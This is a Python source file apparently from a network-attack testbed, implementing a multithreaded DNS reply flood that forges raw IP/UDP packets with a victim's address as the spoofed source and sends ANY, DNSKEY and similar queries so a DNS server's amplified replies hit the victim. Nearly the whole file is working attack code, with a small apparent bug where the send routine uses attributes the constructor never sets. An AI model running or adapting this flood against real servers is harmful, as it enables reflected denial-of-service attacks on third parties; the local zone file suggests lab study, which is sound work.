import os
import sys
import socket
import struct
import random
import time
import threading
import logging
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from attack.attack_strategy import AttackStrategy

console = Console()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()],
)


"""
DNS Reply Flood Attack Implementation

This attack floods a DNS server with massive volumes of legitimate-looking DNS queries,
spoofing the target IP as the source. It mixes queries for:
- Existing domains in the zone file (legitimate)
- Valid but not present domains (e.g., other real domains)

The goal is to overwhelm the server and generate a large number of replies to the spoofed target IP.

NS-3 STYLE PACKET CONSTRUCTION DETAILS:
=======================================

1. IP HEADER (20 bytes) - WITH SPOOFING:
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Source Address (SPOOFED)                   |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Destination Address                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

2. UDP HEADER (8 bytes):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |            Length             |           Checksum            |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

   - Source Port: random (spoofed)
   - Destination Port: DNS server port (usually 53)
   - Length: 8 + DNS packet length
   - Checksum: computed (with pseudo-header)

3. DNS HEADER (12 bytes):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Transaction ID                           |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |QR|   Opcode  |AA|TC|RD|RA|   Z    |        RCODE              |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    QDCOUNT (Questions)                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    ANCOUNT (Answers)                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    NSCOUNT (Authority)                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    ARCOUNT (Additional)                       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

   - Transaction ID: random
   - QR: 0 (Query)
   - Opcode: 0 (Standard Query)
   - AA: 0 (Not Authoritative)
   - TC: 0 (Not Truncated)
   - RD: 1 (Recursion Desired)
   - RA: 0 (Recursion Available - not set in queries)
   - Z: 000 (Reserved bits)
   - RCODE: 0000 (No error)
   - QDCOUNT: 1 (One question)
   - ANCOUNT: 0 (No answers in query)
   - NSCOUNT: 0 (No authority records in query)
   - ARCOUNT: 0 (No additional records in query)

4. DNS QUESTION SECTION (Variable length):
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
   /                     QNAME                     /
   /                                               /
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
   |                     QTYPE                     |
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
   |                     QCLASS                    |
   +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

   QNAME Format (domain name encoding):
   - Length-prefixed labels: 3www7example3com0
   - Each label prefixed by its length (1 byte)
   - Terminated by null byte (0x00)
   Example: "www.example.com" -> b'\x03www\x07example\x03com\x00'

   QTYPE: 1 (A record - IPv4 address), 28 (AAAA), 15 (MX), 5 (CNAME), 2 (NS), 16 (TXT)
   QCLASS: 1 (IN - Internet class)

"""

dns_query_type_dict = {
    2: "NS",
    15: "MX",
    16: "TXT",
    46: "RRSIG",
    48: "DNSKEY",
    255: "ANY",
}


class DNSReplyFlood(AttackStrategy):
    def __init__(
        self,
        server_ip,
        server_port,
        target_ip,
        target_port=12345,
        duration=60,
        threads=20,
        zone_file_path=None,
        valid_domains=None,
        query_types=None,
        log_file=None,
    ):
        super().__init__(server_ip, server_port, duration, threads)
        self.server_ip = server_ip
        self.server_port = server_port
        self.spoofed_ip = target_ip
        self.spoofed_port = target_port
        self.zone_file_path = zone_file_path or os.path.join(
            os.path.dirname(__file__), "../dns_server/zones/primary.zone"
        )
        self.legit_domains = self._load_zone_domains()
        self.valid_domains = valid_domains or [
            "google.com",
            "facebook.com",
            "twitter.com",
            "github.com",
            "stackoverflow.com",
            "microsoft.com",
            "amazon.com",
        ]
        self.query_types = query_types or [
            2,   # NS
            15,  # MX
            16,  # TXT
            46,  # RRSIG
            48,  # DNSKEY
            255, # ANY
        ]

        # Setup file logger (decoupled from console logger)
        log_path = log_file if log_file else "./dns_reply_flood_attack.log"
        self.file_logger = logging.getLogger("DNS_REPLY_FLOOD")
        self.file_logger.setLevel(logging.INFO)
        fh = logging.FileHandler(log_path)
        fh.setFormatter(
            logging.Formatter("[%(asctime)s] %(name)s - %(levelname)s - %(message)s")
        )
        # Remove all handlers before adding
        self.file_logger.handlers.clear()
        self.file_logger.addHandler(fh)
        # Prevent propagation to root logger (so file logs don't show in console)
        self.file_logger.propagate = False

        # Setup console logger (for progress only)
        self.console_logger = logging.getLogger("DNS_REPLY_FLOOD")
        self.console_logger.setLevel(logging.INFO)
        self.console_logger.handlers.clear()
        ch = logging.StreamHandler()
        ch.setFormatter(logging.Formatter("%(message)s"))
        self.console_logger.addHandler(ch)
        # Prevent propagation to root logger (so console logs don't show in file)
        self.console_logger.propagate = False

    def _load_zone_domains(self):
        domains = []
        try:
            with open(self.zone_file_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("$"):
                        continue
                    parts = line.split()
                    if len(parts) >= 1:
                        domain = parts[0]
                        if domain.endswith("."):
                            domain = domain[:-1]
                        domains.append(domain)
        except Exception as e:
            console.print(f"[yellow]Could not load zone file: {e}[/yellow]")
            self.file_logger.warning(f"Could not load zone file: {e}")
        return domains

    def _pick_query_domain(self):
        r = random.random()
        if r < 0.5 and self.legit_domains:
            # 50%: Legitimate domain from zone
            return random.choice(self.legit_domains)
        else:
            # 50%: Valid but not in zone
            return random.choice(self.valid_domains)

    def _encode_domain_name(self, domain):
        encoded = b""
        labels = domain.split(".")
        for label in labels:
            if len(label) > 63:
                raise ValueError(f"Label too long: {label}")
            encoded += bytes([len(label)]) + label.encode("ascii")
        encoded += b"\x00"
        return encoded

    def _create_dns_header(self):
        transaction_id = random.randint(1, 65535)
        flags = 0x0100  # Standard query, recursion desired
        qdcount = 1
        ancount = 0
        nscount = 0
        arcount = 0
        dns_header = struct.pack(
            "!HHHHHH", transaction_id, flags, qdcount, ancount, nscount, arcount
        )
        return dns_header, transaction_id

    def _create_dns_question(self, domain, qtype=1, qclass=1):
        encoded_domain = self._encode_domain_name(domain)
        question = encoded_domain + struct.pack("!HH", qtype, qclass)
        return question

    def _create_dns_query_packet(self, domain, qtype=1):
        dns_header, _ = self._create_dns_header()
        dns_question = self._create_dns_question(domain, qtype)
        dns_packet = dns_header + dns_question
        return dns_packet

    def _create_ip_header(self, source_ip, dest_ip, total_length):
        version = 4
        ihl = 5
        tos = 0
        identification = random.randint(1, 65535)
        flags = 0x4000  # Don't Fragment
        fragment_offset = 0
        ttl = 64
        protocol = socket.IPPROTO_UDP
        check = 0
        saddr = socket.inet_aton(source_ip)
        daddr = socket.inet_aton(dest_ip)
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (version << 4) + ihl,
            tos,
            total_length,
            identification,
            flags | fragment_offset,
            ttl,
            protocol,
            check,
            saddr,
            daddr,
        )
        return ip_header

    def _create_udp_header(self, source_port, dest_port, udp_length):
        checksum = 0
        udp_header = struct.pack("!HHHH", source_port, dest_port, udp_length, checksum)
        return udp_header

    def _calculate_udp_checksum(self, source_ip, dest_ip, udp_header, udp_data):
        pseudo_header = struct.pack(
            "!4s4sBBH",
            socket.inet_aton(source_ip),
            socket.inet_aton(dest_ip),
            0,
            socket.IPPROTO_UDP,
            len(udp_header) + len(udp_data),
        )
        checksum_data = pseudo_header + udp_header + udp_data
        return self.checksum(checksum_data)

    def _create_complete_packet(
        self, source_ip, dest_ip, source_port, dest_port, dns_packet
    ):
        udp_length = 8 + len(dns_packet)
        total_length = 20 + udp_length
        udp_header = self._create_udp_header(source_port, dest_port, udp_length)
        udp_checksum = self._calculate_udp_checksum(
            source_ip, dest_ip, udp_header, dns_packet
        )
        udp_header = struct.pack(
            "!HHHH", source_port, dest_port, udp_length, udp_checksum
        )
        ip_header = self._create_ip_header(source_ip, dest_ip, total_length)
        packet = ip_header + udp_header + dns_packet
        return packet

    def _send_dns_query(self, spoofed_ip, spoofed_port, domain, qtype):
        try:
            dns_packet = self._create_dns_query_packet(domain, qtype)
            complete_packet = self._create_complete_packet(
                spoofed_ip, self.target_ip, spoofed_port, self.target_port, dns_packet
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.sendto(complete_packet, (self.target_ip, 0))
            sock.close()
            self.packets_sent += 1
            # Log DNS request to file only
            req_info = {
                "timestamp": time.time(),
                "query_name": domain,
                "query_type": qtype,
                "spoofed_ip": spoofed_ip,
                "spoofed_port": spoofed_port,
            }
            self.metrics["dns_requests"].append(req_info)
            msg = f"Sent DNS query: {domain} (type {dns_query_type_dict[qtype]}) from {spoofed_ip}:{spoofed_port}"
            self.file_logger.info(msg)
            return True
        except Exception as e:
            err_msg = f"Error sending DNS query: {e}"
            # Only print errors to console
            console.print(f"[red]{err_msg}[/red]")
            self.file_logger.error(err_msg)
            return False

    def _check_privileges(self):
        return self._check_raw_socket_privileges(socket.IPPROTO_UDP)

    def _start_worker_threads(self):
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(
                target=self._dns_flood_worker, name=f"DNSReplyFlood-{i}"
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        return threads

    def _dns_flood_worker(self):
        while self.attack_active:
            try:
                domain = self._pick_query_domain()
                # Increase probability of sending ANY (type 255) requests
                if random.random() < 0.35:
                    qtype = 255  # ANY
                else:
                    qtype = random.choice(self.query_types)
                spoofed_port = (
                    self.spoofed_port
                )  # Always use the target port for sending
                self._send_dns_query(self.spoofed_ip, spoofed_port, domain, qtype)
                time.sleep(0.01)
            except Exception as e:
                err_msg = f"Error in DNS reply flood worker thread: {e}"
                console.print(f"[red]{err_msg}[/red]")
                self.file_logger.error(err_msg)
                continue

    def _monitor_attack_progress(self, start_time):
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0

                if rate < 100:
                    level = "[green]LOW[/green]"
                elif rate < 1000:
                    level = "[yellow]MEDIUM[/yellow]"
                else:
                    level = "[red]HIGH[/red]"

                progress_msg = (
                    f"Rate: {rate:.1f} qps [{level}] | "
                    f"Total sent: [bold cyan]{self.packets_sent:,}[/bold cyan] | "
                    f"Elapsed: [yellow]{elapsed:.1f}s[/yellow]"
                )
                # Clear console line and update
                console.print(f"\r{progress_msg}", end="\r")
                time.sleep(1)
        except KeyboardInterrupt:
            console.print(
                "\n[yellow]🛑 DNS reply flood attack interrupted by user[/yellow]"
            )
            self.file_logger.warning("DNS reply flood attack interrupted by user")

    def log_dns_request_stats(self):
        """Log meaningful stats from metrics['dns_requests'] instead of dumping the array."""
        requests = self.metrics.get("dns_requests", [])
        total = len(requests)
        if total == 0:
            self.file_logger.info("DNS_REQUEST_STATS - No DNS requests recorded.")
            return

        # Unique domains and query types
        domain_counts = {}
        type_counts = {}
        for req in requests:
            domain = req.get("query_name")
            qtype = req.get("query_type")
            domain_counts[domain] = domain_counts.get(domain, 0) + 1
            type_counts[qtype] = type_counts.get(qtype, 0) + 1

        unique_domains = len(domain_counts)
        unique_types = len(type_counts)
        top_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[
            :5
        ]
        top_types = sorted(type_counts.items(), key=lambda x: x[1], reverse=True)

        self.file_logger.info(f"DNS_REQUEST_STATS - Total requests: {total}")
        self.file_logger.info(f"DNS_REQUEST_STATS - Unique domains: {unique_domains}")
        self.file_logger.info(f"DNS_REQUEST_STATS - Unique query types: {unique_types}")
        self.file_logger.info(
            f"DNS_REQUEST_STATS - Top 5 queried domains: {top_domains}"
        )
        self.file_logger.info(
            f"DNS_REQUEST_STATS - Query type counts: {[(dns_query_type_dict.get(t, t), c) for t, c in top_types]}"
        )

    def attack(self):
        self._print_attack_header()
        self._log_attack_parameters()
        if not self._check_privileges():
            return

        self.attack_active = True
        start_time = time.time()
        self.metrics["start_time"] = start_time

        threads = self._start_worker_threads()
        self._print_worker_threads_started()
        self._print_attack_in_progress()

        self._monitor_attack_progress(start_time)
        self.attack_active = False

        self._stop_worker_threads(threads)
        end_time = time.time()
        self._summarize_attack(start_time, end_time)
        self.log_dns_request_stats()

    def _print_attack_header(self):
        header_text = (
            f"[bold red]DNS REPLY FLOOD ATTACK INITIATED[/bold red]\n"
            f"[bold white]Server:[/bold white] [yellow]{self.server_ip}:{self.server_port}[/yellow]\n"
            f"[bold white]Target:[/bold white] [yellow]{self.spoofed_ip}:{self.spoofed_port}[/yellow]\n"
            f"[bold white]Duration:[/bold white] [yellow]{self.duration} seconds[/yellow]\n"
            f"[bold white]Threads:[/bold white] [yellow]{self.threads}[/yellow]"
        )
        console.print(
            Panel.fit(header_text, title="DNS Reply Flood", border_style="magenta")
        )

    def _log_attack_parameters(self):
        self.file_logger.info(
            f"Attack parameters - Duration: {self.duration}s, Threads: {self.threads}"
        )
        self.file_logger.info(
            f"Legit domains: {len(self.legit_domains)}, Valid domains: {len(self.valid_domains)}, Query types: {len(self.query_types)}"
        )
        self.file_logger.info(
            "IP SPOOFING ENABLED: Using target IP as spoofed source for each query"
        )

    def _print_worker_threads_started(self):
        console.print(
            f"[bold green]✓ {self.threads} DNS reply flood worker threads started[/bold green]"
        )

    def _print_attack_in_progress(self):
        console.print(
            "[blue]DNS Reply Flood in progress... Press Ctrl+C to stop[/blue]"
        )

    def _stop_worker_threads(self, threads):
        console.print(
            "\n[bold red]Stopping DNS reply flood attack threads...[/bold red]"
        )
        for thread in threads:
            thread.join(timeout=1)

    def _summarize_attack(self, start_time, end_time):
        duration_sec = end_time - start_time
        total_packets = self.packets_sent
        avg_rate = total_packets / duration_sec if duration_sec > 0 else 0

        self.metrics["end_time"] = end_time
        self.metrics["total_packets"] = total_packets
        self.metrics["avg_rate"] = avg_rate

        if total_packets >= 10000:
            packet_color = "green"
        elif total_packets >= 1000:
            packet_color = "yellow"
        else:
            packet_color = "red"
        if avg_rate >= 1000:
            rate_color = "green"
        elif avg_rate >= 100:
            rate_color = "yellow"
        else:
            rate_color = "red"

        summary_table = Table.grid(padding=(0, 2))
        summary_table.add_column(justify="left")
        summary_table.add_column(justify="right")
        summary_table.add_row(
            "[bold white]📦 Total Packets Sent[/bold white]",
            f"[{packet_color}]{total_packets:,}[/{packet_color}]",
        )
        summary_table.add_row(
            "[bold white]⏱️  Duration[/bold white]",
            f"[cyan]{duration_sec:.2f} seconds[/cyan]",
        )
        summary_table.add_row(
            "[bold white]🚀 Average Rate[/bold white]",
            f"[{rate_color}]{avg_rate:.2f} packets/sec[/{rate_color}]",
        )

        summary_panel = Panel.fit(
            summary_table,
            title="[bold green]DNS REPLY FLOOD COMPLETED[/bold green]",
            border_style="cyan",
        )
        console.print(summary_panel)
        self.file_logger.info(
            f"Attack completed. Packets: {total_packets}, Time: {duration_sec:.2f}s, Rate: {avg_rate:.2f} pps"
        )
